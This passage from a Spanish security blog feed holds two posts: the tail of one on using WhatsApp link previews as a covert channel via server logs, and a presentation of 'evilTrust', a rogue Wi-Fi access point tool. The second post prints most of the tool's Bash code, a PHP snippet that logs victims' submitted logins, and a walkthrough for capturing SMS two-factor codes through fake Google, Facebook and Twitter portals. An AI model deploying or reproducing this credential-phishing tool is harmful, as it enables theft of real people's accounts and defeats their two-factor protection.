2020-02-03T11:15:28.234477+00:00 heroku[router]: at=info method=GET path=&quot;/&quot; host=s4vitar.herokuapp.com request_id=1cc5b49f-eaba-4f5d-828c-4f1ac3dcddcc fwd=&quot;XX.XXX.XXX.160&quot; dyno=web.1 connect=1ms service=3ms status=302 bytes=176 protocol=http
2020-02-03T11:15:28.279973+00:00 heroku[router]: at=info method=GET path=&quot;/robots.txt&quot; host=s4vitar.herokuapp.com request_id=750ddd73-a1f7-4616-9827-119e5b3f280e fwd=&quot;XX.XXX.XXX.160&quot; dyno=web.1 connect=1ms service=2ms status=404 bytes=372 protocol=http
2020-02-03T11:15:28.375122+00:00 heroku[router]: at=info method=GET path=&quot;/index.html&quot; host=s4vitar.herokuapp.com request_id=e9db6b57-a2dc-406f-9d09-2549f65d429a fwd=&quot;XX.XXX.XXX.160&quot; dyno=web.1 connect=1ms service=2ms status=200 bytes=233 protocol=http
2020-02-03T11:15:28.714967+00:00 heroku[router]: at=info method=GET path=&quot;/favicon.ico&quot; host=s4vitar.herokuapp.com request_id=4bfb04e1-3b32-46a7-b0a0-3208e321596e fwd=&quot;XX.XXX.XXX.160&quot; dyno=web.1 connect=1ms service=2ms status=404 bytes=373 protocol=http
2020-02-03T11:15:28.715303+00:00 app[web.1]: 10.111.222.196 - - [03/Feb/2020:11:15:28 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;http://s4vitar.herokuapp.com/index.html&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
```

Ya en este punto, podéis comenzar con la conversación encubierta. 

Lo único que tenéis que hacer es lo siguiente: Abrid una conversación en WhatsApp con alguno de vuestros contactos, haced como si fuerais a enviar un mensaje a vuestro compañero escribiendo la dirección URL (en este caso la mía como PoC) [http://s4vitar.herokuapp.com/](http://s4vitar.herokuapp.com/) y posteriormente escribid vuestro mensaje pegado a la barra `/`, por ejemplo:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/whatsapp-victor.jpg&quot;&gt;
&lt;/p&gt;

Inmediatamente tras introducir los nuevos caracteres después de la barra `/`, empezaréis a ver desde el `heroku logs` a tiempo real los caracteres que se están escribiendo, sin enviar el mensaje a nuestro contacto:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/logs-heroku.jpg&quot;&gt;
&lt;/p&gt;

De hecho si os fijáis, se puede considerar también un posible `IP Disclosure`, dado que podemos ver direcciones IP internas de WhatsApp:

* 10.142.192.223
* 10.99.209.116
* 10.47.180.171

La idea en este punto, sería que nuestro compañero tuviera también descargado nuestro repositorio en local para efectuar el comando `heroku logs` y poder así también visualizar los logs a tiempo de escritura. De esta forma, resulta sencillo montarse un pequeño script en `Bash` u otro lenguaje que parsee la información más relevante, seguido de ciertas reglas que habría que configurar para por ejemplo configurar los nombres de usuario, espacios y algunas cosas adicionales (no es muy costoso).

Lo mejor de esto es que nunca estaremos enviando el mensaje a la persona en cuestión, pues todo esto se hace mientras escribimos antes de enviar.

## ¿Por qué sucede esto?

Cuando enviamos un mensaje a una persona en la que hay incluida una dirección URL, se carga una previsualización de la página antes de enviarlo. De esta forma, ya se está tramitando a nivel de petición un `GET` contra el servidor para obtener así la preview. 

Lo mismo pasaría con el resto de caracteres, por cada caracter que introducimos, es un `GET` que se aplica hacia el servidor, lo que hace que si estamos a la escucha desde el lado del servidor atendiendo a los logs veamos esas peticiones entrantes.

Esto por defecto no sólo pasa en WhatsApp, también ocurre en Twitter, Telegram y otras plataformas.</content><author><name>J0hnTena</name></author><category term="WhatsApp" /><category term="Canales Encubiertos" /><summary type="html">En el siguiente artículo, os muestro una forma de mantener conversaciones encubiertas sin que quede registro en el historial de conversaciones de WhatsApp. De esta forma, dos personas pueden mantener una conversación mediante la lectura de logs a tiempo de escritura sin necesidad de enviar el mensaje.</summary></entry><entry><title type="html">h-c0n 2020 - evilTrust (Herramienta Ofensiva)</title><link href="http://localhost:4000/evil-trust/" rel="alternate" type="text/html" title="h-c0n 2020 - evilTrust (Herramienta Ofensiva)" /><published>2020-02-02T00:00:00-06:00</published><updated>2020-02-02T00:00:00-06:00</updated><id>http://localhost:4000/evil-trust</id><content type="html" xml:base="http://localhost:4000/evil-trust/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/evil.png&quot; width=&quot;200&quot;&gt;
&lt;/p&gt;

Recientemente estuve en la **h-c0n** presentando la herramienta [evilTrust](https://github.com/s4vitar/evilTrust). Antes que nada quiero agradecer a los organizadores del evento por invitarme y a todos los presentes por la gran acogida, lo pasamos entre todos bastante bien.

&lt;div class=&quot;row&quot;&gt;
  &lt;div class=&quot;columns&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo5.png&quot; alt=&quot;Snow&quot; style=&quot;width:30%&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo4.png&quot; alt=&quot;Forest&quot; style=&quot;width:37%&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo2.png&quot; alt=&quot;Mountains&quot; style=&quot;width:30%&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo3.png&quot; alt=&quot;Mountains&quot; style=&quot;width:30%&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo1.png&quot; alt=&quot;Mountains&quot; style=&quot;width:34%&quot;&gt;
    &lt;img src=&quot;/assets/images/evil-trust/Photo6.png&quot; alt=&quot;Mountains&quot; style=&quot;width:34%&quot;&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;br&gt;
Para los interesados, deciros que tenéis la charla disponible en el siguiente enlace:

- [h-c0n 2020 \| evilTrust - Herramienta Ofensiva](https://www.youtube.com/watch?v=-GIA9et7ZRg)

También os la dejo por aquí para aquellos que la quieran ver directamente:

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/-GIA9et7ZRg&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;

## ¿Qué es EvilTrust?

**EvilTrust** es una herramienta ofensiva, ideal para robar los datos de acceso de un usuario. A altos rasgos, la herramienta se encarga de manera automatizada de desplegar un **Rogue AP**, quedando a la espera de clientes potenciales que se asocien a este para proseguir con el ataque.

Cabe decir que el objetivo principal no es el de un ataque **Evil Twin**, puesto que la finalidad no es obtener la contraseña de una red inalámbrica, sino los datos privados del cliente que se asocie al punto de acceso. 

La herramienta dispone de varias plantillas a utilizar, incluyendo una plantilla personalizada, donde el atacante es capaz de desplegar su propia plantilla.

## ¿Qué capacidades trae evilTrust?

Cada una de las plantillas configuradas (Facebook, Twitter, Google, Starbucks, Yahoo, ...) vienen acompañadas de una plantilla de 2FA (Segundo Factor de Autenticación), la cual nos permitirá obtener el código de acceso que se envía por SMS a todo usuario que disponga de esta medida de protección activada.


## ¿Cómo está estructurada la herramienta?

La herramienta está desarrollada en **Bash**, y es capaz de operar en 2 modos en base al parámetro `-m`:

```go
┌─[root@parrot]─[/opt/evilTrust]
└──╼ #./evilTrust.sh 

╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮
╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮
╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯
┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   (Hecho por s4vitar)
┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮
╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯

Uso:
        [-m] Modo de ejecución (terminal|gui) [-m terminal | -m gui]
        [-h] Mostrar este panel de ayuda
```

- **Modo terminal**: Para los amantes de consola que prefieren no hacer uso de interfaz gráfica
- **Modo GUI**: Para los amantes de interfaz gráfica que odian manejarse por consola

Esta parte se gestiona básicamente desde esta porción de código:

```go
# Main Program

if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then
	declare -i parameter_enable=0; while getopts &quot;:m:h:&quot; arg; do
		case $arg in
			m) mode=$OPTARG &amp;&amp; let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ &quot;$mode&quot; == &quot;terminal&quot; ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ &quot;$mode&quot; == &quot;gui&quot; ]; then
			guiMode
		else
			echo -e &quot;Modo no conocido&quot;
			exit 1
		fi
	fi
else
	echo -e &quot;\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}&quot;
	exit 1
fi
```

Tras su ejecución, a través de la función `dependencies`, se hace una comprobación de las herramientas necesarias para que evilTrust funcione:

```go
function dependencies(){
	sleep 1.5; counter=0
	echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n&quot;
	sleep 1

	dependencias=(php dnsmasq hostapd)

	for programa in &quot;${dependencias[@]}&quot;; do
		if [ &quot;$(command -v $programa)&quot; ]; then
			echo -e &quot;. . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada&quot;
			let counter+=1
		else
			echo -e &quot;${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada&quot;
		fi; sleep 0.4
	done

	if [ &quot;$(echo $counter)&quot; == &quot;3&quot; ]; then
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n&quot;
		sleep 3
	else
		echo -e &quot;\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n&quot;
		tput cnorm; exit
	fi
}
```

Tal y como se puede apreciar, para el correcto funcionamiento de la herramienta, es necesario contar con `php`, `dnsmasq` y `hostpad` instalado. En caso de no contar con estas utilidades, evilTrust se encargará de instalar todo lo necesario para poder operar.

Una vez la comprobación es realizada, se llama a la función `startAttack`, donde tal y como su nombre indica... se comienza a desplegar el ataque.

Es en esta fase donde se configurarán una serie de archivos temporales necesarios para desplegar el AP, haciendo que la tarjeta de red opere en modo Router (es obligatorio que la tarjeta de red en uso acepte el **modo monitor**):

```go
function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e &quot;\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}&quot;; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 &gt; /dev/null 2&gt;&amp;1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' &gt; iface)
	counter=1; for interface in $(cat iface); do
		echo -e &quot;\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}&quot;; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne &quot;\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}&quot; &amp;&amp; read choosed_interface

		for interface in $(cat iface); do
			if [ &quot;$choosed_interface&quot; == &quot;$interface&quot; ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e &quot;\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}&quot;; fi
	done

	rm iface 2&gt;/dev/null
	echo -ne &quot;\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} &quot; &amp;&amp; read -r use_ssid
	echo -ne &quot;${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} &quot; &amp;&amp; read use_channel; tput civis
	echo -e &quot;\n${redColour}[!] Matando todas las conexiones...${endColour}\n&quot;
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd &gt; /dev/null 2&gt;&amp;1
	sleep 5

	echo -e &quot;interface=$choosed_interface\n&quot; &gt; hostapd.conf
	echo -e &quot;driver=nl80211\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;ssid=$use_ssid\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;hw_mode=g\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;channel=$use_channel\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;macaddr_acl=0\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;auth_algs=1\n&quot; &gt;&gt; hostapd.conf
	echo -e &quot;ignore_broadcast_ssid=0\n&quot; &gt;&gt; hostapd.conf

	echo -e &quot;${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n&quot;
	sleep 2
	echo -e &quot;${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}&quot;
	hostapd hostapd.conf &gt; /dev/null 2&gt;&amp;1 &amp;
	sleep 6

	echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}&quot;
	echo -e &quot;interface=$choosed_interface\n&quot; &gt; dnsmasq.conf
	echo -e &quot;dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;dhcp-option=3,192.168.1.1\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;dhcp-option=6,192.168.1.1\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;server=8.8.8.8\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;log-queries\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;log-dhcp\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;listen-address=127.0.0.1\n&quot; &gt;&gt; dnsmasq.conf
	echo -e &quot;address=/#/192.168.1.1\n&quot; &gt;&gt; dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d &gt; /dev/null 2&gt;&amp;1 &amp;
    sleep 5
    ...    
```

**Consideración**: A nivel de código, la tarjeta de red que ha sido configurada por defecto tiene nombre `wlan0`. Es importante tener en cuenta que esto no siempre es así, las tarjetas de red pueden referenciarse por nombres distintos y no siempre se llaman igual. En caso de ser distinto, es necesario cambiar su nombre desde el propio código.

En esta fase se nos solicitan varias cosas:

* Nombre del punto de acceso.
* Canal en el que queremos que el punto de acceso opere.
* Interfaz de red a utilizar (por defecto **wlan0**)

Una vez rellenados estos puntos, se desplegará un AP con las configuraciones especificadas, asignado la dirección IP '**192.168.1.1**' a nuestra interfaz de red en modo monitor. 

Ya con estas especificaciones seteadas, se procede a la selección de plantilla:

```go
	# Array de plantillas
	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	tput cnorm; echo -ne &quot;\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n&quot;
	echo -ne &quot;${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} &quot; &amp;&amp; read template

	check_plantillas=0; for plantilla in &quot;${plantillas[@]}&quot;; do
		if [ &quot;$plantilla&quot; == &quot;$template&quot; ]; then
			check_plantillas=1
		fi
	done

	if [ &quot;$template&quot; == &quot;cliqq-payload&quot; ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template &gt; /dev/null 2&gt;&amp;1
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}&quot;
		php -S 192.168.1.1:80 &gt; /dev/null 2&gt;&amp;1 &amp;
		sleep 2
		popd &gt; /dev/null 2&gt;&amp;1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template &gt; /dev/null 2&gt;&amp;1
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}&quot;
		php -S 192.168.1.1:80 &gt; /dev/null 2&gt;&amp;1 &amp;
		sleep 2
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}&quot;
		for i in $(seq 1 45); do echo -ne &quot;${redColour}-&quot;; done &amp;&amp; echo -e &quot;${endColour}&quot;
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne &quot;${redColour}-&quot;; done &amp;&amp; echo -e &quot;${endColour}&quot;
		echo -e &quot;\n${redColour}[!] Presiona &lt;Enter&gt; para continuar${endColour}&quot; &amp;&amp; read
		popd &gt; /dev/null 2&gt;&amp;1; getCredentials
	else
		tput civis; echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}&quot;; sleep 1
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n&quot;; sleep 1
		pushd $template &gt; /dev/null 2&gt;&amp;1
		php -S 192.168.1.1:80 &gt; /dev/null 2&gt;&amp;1 &amp;
		sleep 2
		popd &gt; /dev/null 2&gt;&amp;1; getCredentials
	fi
}
```

Es de esperar que en esta fase, se nos solicite con qué plantilla queremos trabajar. 

En caso de seleccionar alguna, por ejemplo imaginemos... '**google-login**', lo que sucederá es que desde que el cliente se conecte al AP, automáticamente se le abrirá el navegador, siendo redirigido a un portal de autenticación, en este caso, de la plataforma de Google, donde verá que para continuar navegando es necesario loguearse con su cuenta de la plantilla seleccionada.

La víctima en ningún momento verá direcciones IP ni nada por el estilo, por lo que le hará pensar en todo momento que se encuentra en la página oficial.

Cada plantilla está organizada en su propio directorio, donde tras seleccionar aquella con la que queramos trabajar, se efectúa un `pushd` hacia ese directorio para posteriormente montar un servidor web mediante `php` hosteado por el puerto 80.

Ya en este punto, se llama a la función `getCredentials`, que es la que se encargará de monitorizar un fichero desde el cual podremos saber en todo momento quién ha introducido sus credenciales, pudiéndolas ver posteriormente en texto claro:

```go
function getCredentials(){

	tput civis; while true; do
		echo -e &quot;\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}&quot;
		for i in $(seq 1 60); do echo -ne &quot;${redColour}-&quot;; done &amp;&amp; echo -e &quot;${endColour}&quot;
		find \-name datos-privados.txt | xargs cat 2&gt;/dev/null
		for i in $(seq 1 60); do echo -ne &quot;${redColour}-&quot;; done &amp;&amp; echo -e &quot;${endColour}&quot;
		sleep 3; clear
	done
}
```

Dado que es probable que la víctima cuente con el segundo factor de autenticación activado, disponer de sus credenciales a veces no es suficiente... ya que tras loguearnos tendremos que introducir el código que por SMS la plataforma le envía al dispositivo móvil asociado.

No os preocupéis, está todo pensado. Cada plantilla del portal seleccionado cuenta con un fichero `post.php`, donde tras reportar las credenciales a un fichero externo, se aplica un `Redirect` hacia otra plantilla de la misma plataforma, donde se solicita el código recibido:

```php
&lt;?php $file = 'datos-privados.txt'; file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://192.168.1.1/portal_2fa/index.php&quot; /&gt;
```

Para el que no haya entendido bien la jugada, la explico por aquí: La víctima introduce sus credenciales de acceso a la plataforma que hayas escogido para seguir navegando, tú como atacante recibes esas credenciales en texto claro desde consola, posteriormente la víctima es redirigida a otro portal en el que se le pide que introduzca el SMS recibido. El truco está en que la víctima no tiene salida a internet desde tu AP, por lo que nunca recibirá un código de esa sesión, ya que no se está logueando en la plantilla oficial. El chiste está en que tú por detrás, como ya posees sus credenciales, de manera inmediata las vas a estar validando en la plataforma real manualmente, entonces en caso de que posteriormente te pida el código del segundo factor de autenticación, como la víctima está ahora en esa plantilla esperando al código, le va a llegar un SMS pero de tú sesión, no de la suya, lo que le hará pensar que ya una vez introduciéndolo accederá a su cuenta.

De esta forma, te proporcionará el código SMS de tu sesión, pudiendo así posteriormente acceder a su cuenta &quot;burlando&quot; esta medida de protección.

La gran pregunta que algunos me hicisteis... ¿pero y si la víctima no tiene el segundo factor de autenticación habilitado?, pues bueno, en ese caso ya tienes sus credenciales. Es posible que la víctima sospeche y le resulte extraño que se le esté solicitando el código del SMS cuando ni si quiera tiene esa opción configurada, pero es la única forma que se me ocurrió de por lo menos cubrir ambas situaciones. También os digo... un público objetivo de calle no tiene muchas nociones de seguridad y la mayoría de las veces no lo entienden, dejándolo pasar sin sospechar de nada.

En resumen, si la víctima tiene 2FA, podrás obtener el código, y si no lo tiene configurado... en el peor de los casos ya tienes sus credenciales, la víctima se quedará en la nueva plantilla esperando a que le llegue el código cuando nunca le va a llegar y tú mientras por detrás estarás accediendo a su cuenta.

Como pequeña anotación, durante el evento, algunos compañeros hicieron uso de la herramienta y me comentaron que algunos introdujeron incluso hasta sus credenciales de empresa.

## Demo de la herramienta

Configuramos las características de nuestro AP:

![](/assets/images/evil-trust/step_one.png)

Definimos la plantilla a utilizar:

![](/assets/images/evil-trust/step_two.png)

Quedamos a la espera de que alguna víctima se conecte a nuestro AP para visualizar credenciales introducidas:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_three.png&quot;&gt;
&lt;/p&gt;

La víctima ve que hay una WiFi gratis disponible a su alcance y se conecta:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_four.jpg&quot;&gt;
&lt;/p&gt;

Tras la asociación al AP, se abre el navegador de manera automática solicitando las credenciales de acceso a la plataforma para continuar navegando:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_five.jpg&quot;&gt;
&lt;/p&gt;

La víctima introduce sus credenciales para poder continuar navegando:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_six.jpg&quot;&gt;
&lt;/p&gt;

El atacante visualiza las credenciales introducidas:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_seven.png&quot;&gt;
&lt;/p&gt;

La víctima es redirigida al portal del segundo factor de autenticación de la plataforma:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_eight.jpg&quot;&gt;
&lt;/p&gt;

El atacante valida las credenciales de la víctima desde otro navegador y como esta utiliza segundo factor de autenticación, se envía un SMS a la víctima, introduciendo posteriormente su código en la plantilla:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_nine.jpg&quot;&gt;
&lt;/p&gt;

El atacante recibe desde consola el código y posteriormente accede a su cuenta:

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_ten.png&quot;&gt;
&lt;/p&gt;</content><author><name>J0hnTena</name></author><category term="GitHub" /><category term="Bash" /><category term="Herramientas" /><summary type="html">Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.</summary></entry></feed>